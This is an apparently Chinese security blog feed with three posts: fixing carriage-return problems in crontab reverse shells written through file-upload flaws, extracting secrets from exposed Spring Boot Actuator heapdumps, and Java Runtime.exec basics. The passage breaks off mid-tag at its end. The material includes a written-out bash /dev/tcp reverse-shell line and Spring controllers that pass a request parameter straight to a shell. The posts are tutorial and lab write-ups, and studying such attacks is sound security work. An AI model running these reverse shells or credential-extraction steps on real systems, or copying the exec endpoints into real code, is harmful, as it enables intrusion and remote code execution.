        <content type="html"><![CDATA[<h2 id="crontab反弹shell细节问题"><a href="#crontab反弹shell细节问题" class="headerlink" title="crontab反弹shell细节问题"></a>crontab反弹shell细节问题</h2><p>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担。</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​此文是小生针对于springboot框架下，文件上传漏洞RCE姿势研究过程中，衍生出来的一个问题，在[tari]师傅的帮助与自己的苦心研究下，终于得出结果。</p><p>​当遇到文件上传漏洞、或者文件覆盖、任意文件写入漏洞，无法上传目标脚本文件，或者说上传了但不解析…..诸多一系列问题，就不再提了，相信大家也都遇到过，利用姿势也不多，大家最容易想到的，应该就是 corntab反弹shell。</p><p>​有的时候，收不到shell原因非常之多，可能是防火墙，可能是态感，可能是各种设备，可能是乱七八糟的策略，但也有可能是自己payload存在问题。</p><p>​我想这篇博客的标题也可以叫做：</p><h3 id="Linux系统与Http协议换行不同而导致反弹shell异常问题"><a href="#Linux系统与Http协议换行不同而导致反弹shell异常问题" class="headerlink" title="Linux系统与Http协议换行不同而导致反弹shell异常问题"></a>Linux系统与Http协议换行不同而导致反弹shell异常问题</h3><h4 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h4><h5 id="场景还原"><a href="#场景还原" class="headerlink" title="场景还原"></a>场景还原</h5><h6 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h6><p>​首先，小生以攻击者视角，用最基础原生反弹shell做演示，方便引入对这个问题的理解</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/1.png" alt="image-20240515181734190"></p><p>​这个时候，当我们打开这个文件</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/2.png" alt="image-20240515181832512"></p><p>​会出现这种情况，这是因为，没有为其添加换行导致的</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/3.png" alt="image-20240515181851893"></p><p>​这里shell也不会接受到，<strong>因为在crontab中，每一行表示一个计划任务，如果最后一行没有以换行符结尾，那么crontab会认为这不是一个完整，或者是一个无效的命令，所以它不会去执行</strong>，也就说这里没有收到shell的原因，是反弹shell的命令没有被crontab执行</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/4.png" alt="image-20240515181944708"></p><p>这里我们查看日志证明出了，我们的结论，命令没有被执行，所以没有接收到shell</p><h6 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h6><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/5.png" alt="image-20240515182046709"></p><p>​这个#***大家忽略就好</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/6.png" alt="image-20240515182155640"></p><p>​这里可以看到，因为携带了换行，所以反弹shell这条命令 被crontabl当做一条完整且有效的命令，得到了执行</p><p>但这个时候，反弹shell报错不明确重定向</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/7.png" alt="image-20240515182230611"></p><p>​查看日志，留意这里多了一个^M</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/8.png" alt="image-20240515182250264"></p><p>​把这个命令拿出来单独执行</p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/9.png" alt="image-20240515182329079"></p><p>​<img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/10.png" alt="image-20240515182339208"></p><p>​这个时候，得出结论，<strong>命令的确是被执行了，但命令后面多加了一个^M，导致命令是错误的，无法接收到shell</strong></p><p>​</p><p>​这个^M又是什么，它表示回车符(\r)，在Linux中 换行符是\n，Http中 换行符是\r\n</p><p>​这就导致Http报文传输到Linux系统中，出现了对换行解析的问题(直接写入，未处理换行问题)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Http报文 : </span><br><span class="line"></span><br><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.1/9000 0&gt;&amp;1\r\n</span><br><span class="line"></span><br><span class="line">写入到Linux的文件就变成了:</span><br><span class="line"></span><br><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.1/9000 0&gt;&amp;1^M\n</span><br><span class="line"></span><br><span class="line">* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.100.1/9000 0&gt;&amp;1^M</span><br><span class="line"></span><br><span class="line">[我是新的一行哦]</span><br></pre></td></tr></table></figure><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>由简单到麻烦的方法 如下</p><h6 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h6><p>使用nc反弹</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/11.png" alt="image-20240515182620932"></p><p>细心发现 我这里没有写root，因为在后续的学习中，我发现加和不加没有任何影响，因为计划任务的机制中，以文件名确定用户名</p><p>日志查看</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/12.png" alt="image-20240515182638060"></p><p>这里可以看到后面有^M，但依然收到了反弹的shell</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/13.png" alt="image-20240515182657146"></p><p><strong>一个细节就是 bash的位置要写绝对路径！</strong>这个我也没搞清楚是为什么，后续有时间再研究，再对博客进行更新修改</p><h6 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h6><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/14.png" alt="image-20240515182828077"></p><p>删除掉这个\r     原理上述已经讲过 就不赘述了</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/15.png" alt="image-20240515182846976"></p><p>查看日志</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/16.png" alt="image-20240515182906134"></p><p>这里可以看到^M已经没有了</p><p><img src="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/img/17.png" alt="image-20240515182922777"></p><p>成功接收到，其他渗透测试工具中，了解了原理 自然也就会改了。</p><h6 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h6><p>​关于计划任务文件中，对环境变量的设置，因为时间问题，还有我这个环境，就不在做演示了，那一种虽然也可以，比较麻烦，就是通过先声明环境变量</p><p>SHELL&#x3D;&#x2F;bin&#x2F;bash</p><p>PATH&#x3D;&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</p><p>MAILTO&#x3D;root</p><p>后面再跟改好的命令</p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Springboot之Actuator-heapdump漏洞</title>
      <link href="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="Springboot之Actuator-heapdump漏洞"><a href="#Springboot之Actuator-heapdump漏洞" class="headerlink" title="Springboot之Actuator-heapdump漏洞"></a>Springboot之Actuator-heapdump漏洞</h1><p>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</p><h3 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h3><p>​Spring Boot为了解决Spring Framework的入门难度大、配置繁琐而诞生，简化了Spring框架的配置，达到了快速开发提高效率</p><h4 id="Actuator"><a href="#Actuator" class="headerlink" title="Actuator"></a>Actuator</h4><p>​springboot下的一个监控服务，无访问控制的情况下，可以通过HTTP 和 JMX访问，也就意味着存在未授权访问漏洞。在其中，不同的断点对应着不同的目标信息</p><p>​在渗透测试过程中，对攻击者来着，特别需要留意的几个端点</p><table><thead><tr><th><strong>Endpoint ID</strong></th><th><strong>Description</strong></th><th>exploit</th></tr></thead><tbody><tr><td>&#x2F;env</td><td>主机运行开放的所有服务</td><td>根据开发的服务，利用历史披露漏洞</td></tr><tr><td>&#x2F;heapdump</td><td>内存转储文件</td><td>下载后提取shiroKey、ak&#x2F;sk、springboot-admin-client账号密码等等</td></tr><tr><td>&#x2F;trace&#x2F;httptrace</td><td>请求追踪信息</td><td>cookie&#x2F;session等会话凭证泄露</td></tr><tr><td>&#x2F;actuator</td><td>监控主节点</td><td>对端点来说，类似书签管理器</td></tr><tr><td>&#x2F;refresh</td><td>刷新配置</td><td>触发进程刷新，以此来执行我们传入的命令</td></tr></tbody></table><p>补充：在springboot 1.x版本中，直接在上下文路径拼接断点即可访问。但是，到了springboot 2.x版本中，必须加入&#x2F;actuator，例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.example.com/env//version:1.x</span></span><br><span class="line">https:<span class="comment">//www.example.com/actuator/env//version:2.x</span></span><br></pre></td></tr></table></figure><h3 id="heapdump漏洞复现"><a href="#heapdump漏洞复现" class="headerlink" title="heapdump漏洞复现"></a>heapdump漏洞复现</h3><p>​这里演示heapdump的利用-<strong>从内存转储文件中来获取Java 应用程序的内存使用情况</strong>。虽然&#x2F;env下有RCE漏洞，但是有一个Eureka-Client的功能依赖作为前置条件，还需搭配&#x2F;refresh，没有&#x2F;refresh，即使有env下的RCE，有Eureka-Client，也不可能利用成功。在实战中，对于笔者来说从没遇到过，反而heapdump 频率确实非常之高。</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>​这里使用的是阿里云spring脚手架：<a href="https://start.aliyun.com/">https://start.aliyun.com/</a></p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/1.png" alt="image-20240317154654078"></p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/2.png" alt="image-20240317154838485"></p><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><p>​引入actuator的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h5><p>​配置暴露所有actuator端点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">management.endpoints.web.exposure.include=*</span><br></pre></td></tr></table></figure><h5 id="启动并访问"><a href="#启动并访问" class="headerlink" title="启动并访问"></a>启动并访问</h5><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/3.png" alt="image-20240317155450633"></p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/4.png" alt="image-20240317155646582"></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>​解析heapdump有常用的三款工具：MAT、jvisualvm、JDumpSpider，比较推荐JDumpSpider，这里演示后两种</p><p>​访问</p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/5.png" alt="image-20240317155904840"></p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/6.png" alt="image-20240317160019518"></p><h5 id="jvisualvm"><a href="#jvisualvm" class="headerlink" title="jvisualvm"></a>jvisualvm</h5><p>​Java VisualVM，简称 JVisualVM，是 JDK 自带的一个图形化工具，用于监控、故障排除和性能调优 Java 应用程序。它位于 JAVA_HOME&#x2F;bin 目录下，提供了丰富的功能，能够帮助开发人员对 Java 应用程序进行监控和分析。对于我们来说，就是可以直接查看heapdump中的信息。</p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/7.png" alt="image-20240317160648167"></p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/8.png" alt="image-20240317160731842"></p><p>装入&#x3D;&gt;选择heapdump</p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/9.png" alt="image-20240317160950829"></p><p>后续对敏感信息的获取，比如shiro的密钥，ak&#x2F;sk，Redis的明文密码等等等，都需要使用OQL语法，在oql控制台中进行查询</p><p>没装组件，凑个图</p><p><img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/10.png" alt="image-20240317163759422"></p><h5 id="JDumpSpider"><a href="#JDumpSpider" class="headerlink" title="JDumpSpider"></a>JDumpSpider</h5><p>​<a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p><p>​这个比jvisualvm更人性化一点，毕竟jvisualvm不是为了做渗透的，它自动对敏感信息进行读取，我们就不用再用oql语句查询了</p><p>​<img src="/2024/03/17/Springboot%E4%B9%8BActuator-heapdump%E6%BC%8F%E6%B4%9E/img/11.png" alt="image-20240317164125859"></p><p>​后面的信息就不截图了，总之得到了heapdump可以说目标机器已经被拿下了</p><p>​</p><h1 id="end"><a href="#end" class="headerlink" title="end"></a><em>end</em></h1>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java命令执行</title>
      <link href="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Java命令执行"><a href="#Java命令执行" class="headerlink" title="Java命令执行"></a>Java命令执行</h2><p>​</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>​<strong>自己的学习记录，如有不足或疑问，欢迎指出或提问，谢谢。</strong></p><p>​文章介绍java的命令执行 以及 通过反射调用命令执行的扫盲知识。</p><p>​原生JDK提供了三个类来执行系统命令：java.lang.Runtime、java.lang.ProcessBuilder、java.lang.ProcessImpl。</p><p>​本文都是基于springboot实现web，不乏会有些注解。</p><h3 id="java-lang-Runtime"><a href="#java-lang-Runtime" class="headerlink" title="java.lang.Runtime"></a>java.lang.Runtime</h3><p>​java.lang包下的一个类，默认被导入，也就是说我们无需手动import，即可调用此类里面的方法</p><p>​Runtime是java.lang的一个类，主要是与操作系统交互执行命令，其中最常用的 就是<code>exec() </code></p><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/1.png" alt="image-20240310141721486"></p><p>​jdk8中，<code>exec()</code>有六种重载形式，可以传入不同的参数类型来执行命令，这里演示<strong>exec(String command)<strong>、</strong>exec(String[] cmdarray)</strong></p><h4 id="exec-String-command"><a href="#exec-String-command" class="headerlink" title="exec(String command)"></a>exec(String command)</h4><p>​在单独的进程中执行指定的字符串命令。</p><p>​简单来说就是直接执行字符串命令。</p><h5 id="java实现"><a href="#java实现" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">Runtime.getRuntime().exec(command)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实现 </span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cmdstring</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="comment">//使用BufferedReader设置编码解决执行命令响应中文乱码问题</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在主方法中直接调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">command1</span> <span class="operator">=</span> <span class="string">&quot;cmd /c whoami&quot;</span>;</span><br><span class="line">cmdstring(command1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/2.png" alt="img"></p><h5 id="javaweb实现"><a href="#javaweb实现" class="headerlink" title="javaweb实现"></a>javaweb实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/execRuntimeString&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execRuntimeString</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//逐行读取</span></span><br><span class="line">            System.out.println(line);</span><br><span class="line">            out.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此处简单说一下注解，这三个都是spring框架中的注解，后续文章中再次出现，笔者就不在赘述了。</p><p><strong>@Controller</strong>：声明此类为控制器，也就是MVC中的”C”：controller层代码的功能</p><p><strong>@ResponseBody</strong>：当方法被调用时，返回的对象将被转换为响应体，并发送给客户端</p><p><strong>@RequestMapping</strong>：映射请求路径和方法，类似于Servlet中的@WebServlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url：http://localhost:8080/execRuntimeString?command=whoami</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/3.png" alt="image-20240310151224849"></p><h4 id="exec-String-cmdarray"><a href="#exec-String-cmdarray" class="headerlink" title="exec(String[] cmdarray)"></a>exec(String[] cmdarray)</h4><p>在单独的进程中执行指定的命令和参数。</p><p>简单来说就是以数组的形式接收多个字符串然后执行。</p><h5 id="java实现-1"><a href="#java实现-1" class="headerlink" title="java实现"></a>java实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line">String[] command = &#123;<span class="string">&quot;powershell&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;ping www.baidu.com&quot;</span>&#125;</span><br><span class="line">Runtime.getRuntime().exec(command);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cmdarray</span><span class="params">(String[] command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(command);</span><br><span class="line">        <span class="comment">//使用BufferedReader设置编码解决执行命令响应中文乱码问题</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//主方法直接调用 </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] command2 = &#123;<span class="string">&quot;powershell&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;ping www.baidu.com&quot;</span>&#125;;</span><br><span class="line">        cmdarray(command2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/4.png" alt="image-20240310152142609"></p><h5 id="javaweb中实现"><a href="#javaweb中实现" class="headerlink" title="javaweb中实现"></a>javaweb中实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/execRuntimeArray&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execRuntimeArray</span><span class="params">(String command, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        String[] commandarray =&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,command&#125;;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(commandarray);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), Charset.forName(<span class="string">&quot;GBK&quot;</span>)));</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//逐行读取</span></span><br><span class="line">            System.out.println(line);</span><br><span class="line">            out.print(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/03/11/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/img/5.png" alt="image-20240310152443364"></p><h3 id="java-lang-ProcessBuilder"><a href="#java-lang-ProcessBuilder" class="headerlink" 